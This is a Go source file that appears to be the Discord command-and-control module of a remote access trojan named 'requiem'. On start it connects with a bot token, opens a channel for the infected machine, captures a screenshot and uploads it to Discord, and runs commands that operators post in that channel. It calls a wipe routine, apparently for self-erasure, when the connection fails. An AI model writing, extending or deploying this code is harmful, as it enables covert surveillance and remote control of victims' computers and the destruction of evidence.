package bot

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/store"
	"requiem/utils"
	"requiem/utils/discord"

	"github.com/bwmarrin/discordgo"
)

var targetChannel string

func Start() {
	bot, err := discordgo.New("Bot " + store.BOT_TOKEN)
	if err != nil {
		utils.DebugLog(fmt.Sprintf("failed to create bot - %v", err))
		funcs.Wipe()
		return
	}

	bot.AddHandler(handler)

	err = bot.Open()
	if err != nil {
		utils.DebugLog(fmt.Sprintf("failed to open bot - %v", err))
		funcs.Wipe()
		return
	}

	registerCommands()

	categoryID := store.CATEGORY_ID
	if categoryID == "" {
		categoryID = discord.FindCategory(bot)
	}

	channelID, new := discord.FindChannel(bot, categoryID)
	targetChannel = channelID

	message := discord.GetConnectionMsg(new)

	buffer := funcs.TakeScreenshot()
	if buffer != nil {
		bot.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
			Content: message,
			Files: []*discordgo.File{{
				Name:   "ss.jpg",
				Reader: buffer,
			}},
		})
	} else {
		bot.ChannelMessageSend(
			channelID,
			message,
		)
	}

	select {}
}

func handler(ses *discordgo.Session, msg *discordgo.MessageCreate) {
	defer func() {
		err := recover()
		if err != nil {
			ses.ChannelMessageSendReply(
				msg.ChannelID,
				fmt.Sprintf("⚠️ FATAL ERROR: %v", err),
				msg.Reference(),
			)
		}
	}()

	if msg.Author.ID == ses.State.User.ID {
		return
	}

	if !strings.HasPrefix(msg.Content, store.COMMAND_PREFIX) {
		return
	}

	parts := strings.Fields(msg.Content[len(store.COMMAND_PREFIX):])
	if len(parts) == 0 {
		return
	}

	name := strings.ToLower(parts[0])

	if name == "list" {
		link := fmt.Sprintf(
			"https://discord.com/channels/%s/%s",
			store.SERVER_ID,
			targetChannel,
		)

		ses.ChannelMessageSendReply(msg.ChannelID, link, msg.Reference())
		return
	}

	if msg.ChannelID != targetChannel {
		return
	}

	if name == "help" {
		var help strings.Builder

		help.WriteString("**Commands:**\n```\n")

		for _, command := range commandsList {
			help.WriteString(command.Name())
			help.WriteString(" - ")
			help.WriteString(command.Info())
			help.WriteString("\n")
		}

		fmt.Fprintf(&help, "```\nPrefix: `%s`", store.COMMAND_PREFIX)

		ses.ChannelMessageSendReply(msg.ChannelID, help.String(), msg.Reference())
		return
	}

	command, exists := commandsList[name]
	if exists {
		go command.Exec(ses, msg, parts[1:])
	} else {
		ses.ChannelMessageSendReply(
			msg.ChannelID,
			"This command does not exist.",
			msg.Reference(),
		)
	}
}
